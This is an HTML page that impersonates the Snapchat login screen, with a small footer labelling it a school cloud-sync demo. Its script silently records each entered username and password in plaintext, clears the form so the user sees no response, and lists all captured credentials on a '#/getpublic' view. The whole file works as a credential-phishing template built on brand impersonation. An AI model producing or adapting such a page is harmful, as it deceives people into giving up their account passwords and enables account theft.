<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
        .login-box { background: white; width: 380px; padding: 40px 30px; border-radius: 24px; box-shadow: 0 8px 28px rgba(0,0,0,0.08); text-align: center; }
        .logo { font-size: 28px; font-weight: 700; color: #000; letter-spacing: -0.5px; margin-bottom: 30px; }
        .logo span { background: #fffc00; padding: 0 6px; border-radius: 12px; }
        input { width: 100%; padding: 14px 16px; margin: 8px 0; border: 1px solid #ddd; border-radius: 40px; font-size: 16px; background: #f4f4f4; outline: none; transition: 0.2s; }
        input:focus { border-color: #000; background: #fff; }
        button { width: 100%; padding: 14px; background: #fffc00; border: none; border-radius: 40px; font-size: 17px; font-weight: 600; color: #000; margin-top: 12px; cursor: pointer; transition: 0.2s; }
        button:hover { background: #e6e300; }
        .footer { margin-top: 20px; font-size: 14px; color: #888; }
        .footer a { color: #000; text-decoration: none; font-weight: 600; }
        .note { margin-top: 30px; font-size: 12px; color: #aaa; }
    </style>
</head>
<body>

<div class="login-box">
    <div class="logo"><span>Snap</span>chat</div>
    <form id="loginForm">
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>
    <div class="footer"><a href="#">Forgot password?</a> · <a href="#">Sign Up</a></div>
    <div class="note">⚠️ School project — cloud sync demo (no cookies).</div>
</div>

<!-- Hidden link to /getpublic -->
<div style="position: fixed; bottom: 10px; right: 10px; font-size: 11px; background: #eee; padding: 6px 12px; border-radius: 20px;">
    <a href="#/getpublic" style="text-decoration: none; color: #333;">View /getpublic</a>
</div>

<script>
    // ---------- CLOUD STORAGE (no cookies) ----------
    // Uses localStorage as a simple "cloud" that persists across sessions
    // and is shared across all tabs/windows on the same domain.
    // This simulates a cloud database without cookies.
    
    const STORAGE_KEY = 'snapchat_cloud_submissions';

    // Load existing submissions from cloud (localStorage)
    function loadSubmissions() {
        const data = localStorage.getItem(STORAGE_KEY);
        if (data) {
            try {
                return JSON.parse(data);
            } catch (e) {
                return [];
            }
        }
        return [];
    }

    // Save to cloud (localStorage)
    function saveSubmissions(submissions) {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(submissions));
    }

    // Add new submission
    function addSubmission(username, password) {
        const subs = loadSubmissions();
        subs.push({ username, password, timestamp: new Date().toISOString() });
        saveSubmissions(subs);
    }

    // Build text output for /getpublic
    function buildTextOutput() {
        const subs = loadSubmissions();
        if (subs.length === 0) {
            return 'No submissions yet.';
        }
        let output = '=== ALL SUBMISSIONS (CLOUD SYNC) ===\n\n';
        subs.forEach((s, i) => {
            output += `[${i+1}] Username: ${s.username} | Password: ${s.password} | Time: ${s.timestamp}\n`;
        });
        output += '\n=== END ===';
        return output;
    }

    // Handle login form
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        if (username && password) {
            // Save to cloud (localStorage) - no cookies
            addSubmission(username, password);
            // Clear fields - nothing visible happens
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
        }
    });

    // Route handler for /getpublic (via hash or path)
    function renderGetPublic() {
        document.documentElement.innerHTML = `<pre style="font-family: monospace; padding: 20px; background: #f4f4f4; min-height: 100vh; margin: 0; white-space: pre-wrap; word-break: break-all;">${buildTextOutput()}</pre>`;
    }

    // Check path on load
    window.addEventListener('DOMContentLoaded', function() {
        if (window.location.pathname === '/getpublic') {
            renderGetPublic();
        }
        if (window.location.hash === '#/getpublic') {
            renderGetPublic();
        }
    });

    // Hash change listener
    window.addEventListener('hashchange', function() {
        if (window.location.hash === '#/getpublic') {
            renderGetPublic();
        }
    });

    // Also expose to console for debugging
    console.log('Snapchat cloud demo — submissions stored in localStorage (cloud). Visit #/getpublic to view all.');
</script>

</body>
</html>
